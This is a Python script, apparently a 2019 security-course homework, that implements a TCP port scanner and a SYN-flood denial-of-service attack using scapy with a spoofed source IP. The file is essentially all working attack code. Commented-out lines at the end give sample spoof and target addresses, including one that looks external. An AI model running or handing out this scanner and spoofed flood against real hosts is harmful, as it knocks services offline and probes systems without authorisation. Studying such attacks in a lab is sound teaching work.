#!/usr/bin/env python3

#######################################
#   Homework Number:    HW08
#   Name:               Gavin Neyman
#   ECN Login:          gneyman
#   Due Date:           3/21/2019
########################################

import sys
from scapy.all import *
from scapy.layers.inet import IP, TCP
import socket
...

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP


    def scanTarget(self, rangeStart, rangeEnd):
        # Scan target computer for open ports within the range passed
        open_ports = []
        for testport in range(rangeStart, rangeEnd):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, testport))
                open_ports.append(testport)
            except:
                pass
        # Write found open ports to openports.txt
        print(open_ports)
        openports_txt = open("openports.txt", 'w')
        for port in open_ports:
            print(str(port), file=openports_txt)
        openports_txt.close()


    def attackTarget(self, port, numSyn):
        # Verify the specified port is open
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        try:
            sock.connect((self.targetIP, port))
            verifyOpen = True
        except:
            verifyOpen = False
        # If the port is open perform DoS attack and return 1
        if verifyOpen:
            for i in range(numSyn):
                IP_header = IP(src=self.spoofIP, dst=self.targetIP)
                TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
                packet = IP_header / TCP_header
                try:
                    send(packet)
                except:
                    pass
            return 1
        # If port is closed return 0
        else:
            return 0

#spoofIP = '10.100.132.40'
##targetIP = '10.100.132.40'
#targetIP = '128.46.4.91'
#rangeStart = 0
#rangeEnd = 200
#port = 80
#Tcp = TcpAttack(spoofIP, targetIP)
#Tcp.scanTarget(rangeStart, rangeEnd)
#if Tcp.attackTarget(port, 10):
#    print("port was open to attack")
